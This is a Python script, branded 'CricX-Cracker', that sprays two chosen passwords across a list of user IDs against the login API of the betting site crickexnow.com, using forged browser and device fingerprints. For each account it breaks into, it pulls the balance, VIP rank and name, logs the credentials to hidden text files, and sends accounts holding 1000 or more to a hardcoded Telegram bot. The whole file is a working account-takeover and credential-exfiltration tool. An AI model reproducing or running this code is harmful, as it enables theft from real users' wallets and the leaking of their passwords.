import os
import json
import time
import shutil
import requests
import threading
import re
from concurrent.futures import ThreadPoolExecutor

# ANSI Colors
BOLD = '\033[1m'
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
D = '\033[0m'
C = '\033[96m'

lock = threading.Lock()
successful_users = set()

def show_logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    RESET = '\033[0m'
    COLORS = ['\033[38;5;27m', '\033[38;5;33m', '\033[38;5;39m', '\033[38;5;45m', '\033[38;5;51m']
    ASCII = '\n   _________    ____              _          \n  /  _/ ___/___/ __/__ ________  (_)__  ___ _\n _/ // (_ /___/ _// _ `/ __/ _ \\/ / _ \\/ _ `/\n/___/\\___/   /___/\\_,_/_/ /_//_/_/_//_/\\_, / \n                                      /___/  \n'
    subtitle = 'CricX-Cracker V-0.9 (Deep Balance Scanner)'
    width = shutil.get_terminal_size(fallback=(80, 20)).columns
    for i, line in enumerate([ln.center(width) for ln in ASCII.splitlines()]):
        print(COLORS[i % len(COLORS)] + BOLD + line + RESET)
    print(COLORS[-1] + BOLD + subtitle.center(width) + RESET + '\n')

def get_balance_deep(data):
    """bb.py থেকে ব্যালেন্স পাওয়ার লজিক"""
    try:
        # 1. প্রথমে totalMainProviderBalance চেক করা
        if 'totalMainProviderBalance' in data and data['totalMainProviderBalance'] is not None:
            return data['totalMainProviderBalance']
        
        # 2. mainWallet চেক করা
        if 'mainWallet' in data and data['mainWallet'] is not None:
            return data['mainWallet']
        
        # 3. সরাসরি balance keys চেক করা
        balance_keys = ['balance', 'mainBalance', 'totalBalance', 'availableBalance', 
                       'walletBalance', 'currentBalance', 'totalAvailableBalance']
        
        for key in balance_keys:
            if key in data and data[key] is not None:
                return data[key]
        
        # 4. মেম্বার বা ওয়ালেট অবজেক্টে চেক করা
        if 'member' in data and isinstance(data['member'], dict):
            if 'mainWallet' in data['member'] and data['member']['mainWallet'] is not None:
                return data['member']['mainWallet']
        
        if 'wallet' in data and isinstance(data['wallet'], dict):
            wallet_keys = ['mainWallet', 'balance', 'totalBalance', 'availableBalance']
            for key in wallet_keys:
                if key in data['wallet'] and data['wallet'][key] is not None:
                    return data['wallet'][key]
        
        return 0
    except Exception as e:
        return 0

def get_balance_value(balance):
    """ব্যালেন্স থেকে সংখ্যাসংখ্যা extract করা"""
    try:
        if isinstance(balance, (int, float)):
            return float(balance)
        elif isinstance(balance, str):
            nums = re.findall(r'\d+\.?\d*', balance)
            return float(nums[0]) if nums else 0
        return 0
    except:
        return 0

def attempt_login(user_id, pw):
    global successful_users
    with lock:
        if user_id in successful_users: return

    headers = {
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json, text/plain, */*',
        'Referer': 'https://crickexnow.com/bd/en/login',
        'Origin': 'https://crickexnow.com',
    }

    payload = {
        'languageTypeId': 1, 'currencyTypeId': 8, 'getIntercomInfo': True,
        'userId': user_id.lower().strip(), 'password': pw,
        'fingerprint2': '58df140599f977faf8951888e888e807',
        'fingerprint4': 'f91cf49459fdec23221fc66161a3fa20',
        'browserHash': '3969af0f2862ebb0d85edf6ea8430292',
        'deviceHash': '15cfad26f3a3679721b1e64b20fee5ec'
    }

    try:
        response = requests.post('https://crickexnow.com/api/bt/v2_1/user/login', headers=headers, json=payload, timeout=15)
        if response.status_code == 200:
            res = response.json()
            if res.get('status') == '000000':
                data = res.get('data', {})
                
                balance = get_balance_deep(data)
                level = data.get('vipInfo', {}).get('nowVipName', 'Normal')
                uid = data.get('userId', user_id)
                
                # নাম পাওয়ার চেষ্টা (fullName, name, username, nickName)
                name_keys = ['fullName', 'name', 'username', 'nickName', 'realName']
                display_name = uid  # ডিফল্ট হিসেবে ID
                for key in name_keys:
                    if key in data and data[key]:
                        display_name = data[key]
                        break

                with lock: successful_users.add(user_id)
                
                is_high = level not in ['Normal', 'Bronze']
                filename = '.high.txt' if is_high else '.normal.txt'
                color = G if is_high else Y
                status = 'Good' if is_high else 'Poor'
                earn = '2 BDT' if is_high else '1 BDT'

                bal_val = get_balance_value(balance)
                
                if bal_val >= 1000:
                    send_telegram(uid, pw, balance, level, display_name)
                    if bal_val >= 10000: 
                        earn = '100 BDT'
                        color = C
                    elif bal_val >= 1500: 
                        earn = '50 BDT'
                        color = G

                # এখন শুধু নাম প্রিন্ট করবে (ID নয়)
                print(f'{BOLD}{color} Name: {display_name} | Profile : {status} | Earned : {earn} {D}')

                with open(filename, 'a', encoding='utf-8') as f:
                    f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level} | Name: {display_name}\n')
                    
                if bal_val > 0:
                    with open('.balances.txt', 'a', encoding='utf-8') as f:
                        f.write(f'{uid} | {pw} | {balance} | {level} | {display_name}\n')

            elif res.get('status') == 'S0001': 
                time.sleep(10)
        elif response.status_code == 403: 
            time.sleep(15)
    except Exception as e:
        pass

def send_telegram(uid, pw, balance, level, name):
    token = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
    cid = '-1003275746200'
    msg = f'🔥 [CX HIT 1000+]\n👤 User ID: `{uid}`\n📛 Name: {name}\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
    try: 
        requests.post(f'https://api.telegram.org/bot{token}/sendMessage', 
                     json={'chat_id': cid, 'text': msg, 'parse_mode': 'Markdown'},
                     timeout=5)
    except: 
        pass

def main():
    show_logo()
    if not os.path.exists('.uids.txt'):
        print(f'{R} [!] .uids.txt not found!{D}'); 
        return
    
    p1 = input(f'{Y} PASSWORD 1 : {D}').strip()
    p2 = input(f'{Y} PASSWORD 2 : {D}').strip()
    
    with open('.uids.txt', 'r') as f:
        users = [ln.strip().split()[0] for ln in f if ln.strip()]

    print(f'{BOLD}{Y} [>] ATTACK STARTED ON {G}[{len(users)}]{Y} USERS...{D}')
    print(f'{Y} ------------------------------------------------------\n{D}')

    with ThreadPoolExecutor(max_workers=2) as ex:
        for u in users:
            ex.submit(attempt_login, u, p1)
            ex.submit(attempt_login, u, p2)

if __name__ == '__main__':
    main()
